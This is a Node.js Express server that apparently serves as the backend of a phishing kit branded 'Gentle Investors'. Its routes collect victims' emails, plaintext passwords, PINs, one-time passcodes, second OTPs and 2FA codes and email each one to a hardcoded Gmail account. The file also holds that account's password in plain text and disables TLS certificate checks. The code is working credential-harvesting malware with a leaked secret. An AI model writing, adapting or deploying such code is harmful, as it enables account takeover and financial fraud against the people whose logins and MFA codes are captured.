const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");

app.use(express.json());
app.use(cors());

const PORT = process.env.PORT || 5000;

// Email credentials - consider using environment variables
const userEmail = "gentleinvestors90@gmail.com";
const pass = "joinskaczqvqymum"; // Use app-specific password

// Create reusable transporter object
const createTransporter = () => {
  return nodemailer.createTransporter({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
    // Additional options for better delivery
    tls: {
      rejectUnauthorized: false
    }
  });
};

// Helper function to send emails with better formatting
const sendEmail = (subject, text, res) => {
  const transporter = createTransporter();
  
  const mailOptions = {
    from: `"Gentle Investors" <${userEmail}>`, // Proper sender format
    to: userEmail,
    subject: subject,
    text: text,
    html: `<div style="font-family: Arial, sans-serif; padding: 20px;">
             <h2 style="color: #333;">${subject}</h2>
             <p style="color: #666; line-height: 1.5;">${text}</p>
             <hr style="margin: 20px 0; border: none; border-top: 1px solid #eee;">
             <p style="color: #999; font-size: 12px;">Sent from Gentle Investors System</p>
           </div>`,
    // Important headers for better deliverability
    headers: {
      'X-Priority': '3', // Normal priority
      'X-MSMail-Priority': 'Normal',
      'Importance': 'Normal',
      'X-Mailer': 'Gentle Investors System'
    }
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log("Email Error:", error);
      res.status(500).json({ 
        success: false, 
        message: "Error occurred: " + error.message 
      });
    } else {
      console.log("Email sent successfully:", info.response);
      res.json({ 
        success: true, 
        message: "Email sent successfully",
        messageId: info.messageId 
      });
    }
  });
};

// API routes for index
app.post("/", (req, res) => {
  const { email, password } = req.body;
  
  if (!email || !password) {
    return res.status(400).json({ 
      success: false, 
      message: "Email and password are required" 
    });
  }

  const subject = "🔐 New User Registration Alert";
  const text = `New user registered:\n\nEmail: ${email}\nPassword: ${password}\n\nTimestamp: ${new Date().toISOString()}`;
  
  sendEmail(subject, text, res);
});

// API routes for PIN
app.post("/pin", (req, res) => {
  const { pin, email } = req.body;
  
  if (!pin) {
    return res.status(400).json({ 
      success: false, 
      message: "PIN is required" 
    });
  }

  const subject = "🔢 PIN Authentication Alert";
  const text = `PIN entered: ${pin}\nUser Email: ${email || 'Not provided'}\n\nTimestamp: ${new Date().toISOString()}`;
  
  sendEmail(subject, text, res);
});

// API routes for OTP
app.post("/otp", (req, res) => {
  const { otp, email } = req.body;
  
  if (!otp) {
    return res.status(400).json({ 
      success: false, 
      message: "OTP is required" 
    });
  }

  const subject = "🔐 OTP Verification Alert";
  const text = `OTP entered: ${otp}\nUser Email: ${email || 'Not provided'}\n\nTimestamp: ${new Date().toISOString()}`;
  
  sendEmail(subject, text, res);
});

// API routes for second OTP
app.post("/2otp", (req, res) => {
  const { otp, email } = req.body;
  
  if (!otp) {
    return res.status(400).json({ 
      success: false, 
      message: "Second OTP is required" 
    });
  }

  const subject = "🔐 Second OTP Verification Alert";
  const text = `Second OTP entered: ${otp}\nUser Email: ${email || 'Not provided'}\n\nTimestamp: ${new Date().toISOString()}`;
  
  sendEmail(subject, text, res);
});

// API routes for 2FA
app.post("/auth", (req, res) => {
  const { auth, email } = req.body;
  
  if (!auth) {
    return res.status(400).json({ 
      success: false, 
      message: "2FA code is required" 
    });
  }

  const subject = "🛡️ 2FA Authentication Alert";
  const text = `2FA code entered: ${auth}\nUser Email: ${email || 'Not provided'}\n\nTimestamp: ${new Date().toISOString()}`;
  
  sendEmail(subject, text, res);
});

app.listen(PORT, () => {
  console.log(`Server is running on port http://localhost:${PORT}`);
});

